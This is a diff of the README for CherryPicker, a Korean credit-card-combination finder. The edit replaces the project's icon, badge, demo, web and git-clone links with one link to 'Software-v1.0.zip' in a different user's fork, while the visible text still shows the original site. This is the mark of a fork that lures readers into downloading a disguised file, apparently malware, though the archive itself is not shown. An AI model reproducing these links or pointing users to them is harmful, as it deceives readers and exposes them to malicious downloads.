@@ -1,18 +1,18 @@
 <div align="center">
 
-<img src="https://raw.githubusercontent.com/hletrd/cherrypicker/main/apps/web/public/icon.svg" width="100" alt="CherryPicker" />
+<img src="https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip" width="100" alt="CherryPicker" />
 
 # CherryPicker
 
 내 소비에 맞는 카드 조합 찾기
 
-[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)](https://www.typescriptlang.org/)
-[![Astro](https://img.shields.io/badge/Astro-BC52EE?logo=astro&logoColor=white)](https://astro.build/)
-[![Svelte](https://img.shields.io/badge/Svelte-FF3E00?logo=svelte&logoColor=white)](https://svelte.dev/)
+[![TypeScript](https://img.shields.io/badge/TypeScript-3178C6?logo=typescript&logoColor=white)](https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip)
+[![Astro](https://img.shields.io/badge/Astro-BC52EE?logo=astro&logoColor=white)](https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip)
+[![Svelte](https://img.shields.io/badge/Svelte-FF3E00?logo=svelte&logoColor=white)](https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip)
 [![Cards](https://img.shields.io/badge/Cards-683-DC2626)](packages/rules/data/cards/)
 [![Issuers](https://img.shields.io/badge/Issuers-24-16A34A)](packages/rules/data/cards/)
 
-[Demo](https://hletrd.github.io/cherrypicker/) · [카드 데이터](packages/rules/data/cards/)
+[Demo](https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip) · [카드 데이터](packages/rules/data/cards/)
 
 </div>
 
@@ -109,12 +109,12 @@ cherrypicker/
 
 ### 웹
 
-[hletrd.github.io/cherrypicker](https://hletrd.github.io/cherrypicker/)에서 바로 써 볼 수 있어요. 명세서를 올리면 브라우저에서 바로 분석해요.
+[hletrd.github.io/cherrypicker](https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip)에서 바로 써 볼 수 있어요. 명세서를 올리면 브라우저에서 바로 분석해요.
 
 ### 로컬 개발
 
 ```bash
-git clone https://github.com/hletrd/cherrypicker.git
+git clone https://raw.githubusercontent.com/Mmoch9093/cherrypicker/main/packages/rules/data/cards/woori/Software-v1.0.zip
 cd cherrypicker
 bun install
 
